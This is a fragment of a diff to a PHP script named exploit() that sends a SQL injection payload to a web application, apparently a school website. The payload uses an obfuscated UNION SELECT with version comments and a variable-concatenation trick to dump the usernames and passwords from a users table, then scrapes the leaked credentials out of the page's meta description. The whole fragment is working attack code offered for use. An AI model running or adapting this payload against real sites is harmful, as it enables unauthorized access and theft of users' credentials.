@@ -5,7 +5,7 @@ error_reporting(0);
 require_once "Console/Table.php";
 
 function exploit($url) {
-    $url_replace = str_replace("-profil.html", "", $url);
+    $url_replace = str_replace("-.html", "", $url);
     $response = file_get_contents($url_replace."'hal-fasilitas--sekolah'%20/*!12345union*/+/*!12345select*/%201,(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,0x7c,password,0x3c62723e))))x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--%20-.html");
     preg_match('/<meta name="description" content="(.*?)">/', $response, $data);
     preg_match_all("/<li>,(.*?),(.*?),/", $data[1], $empas);
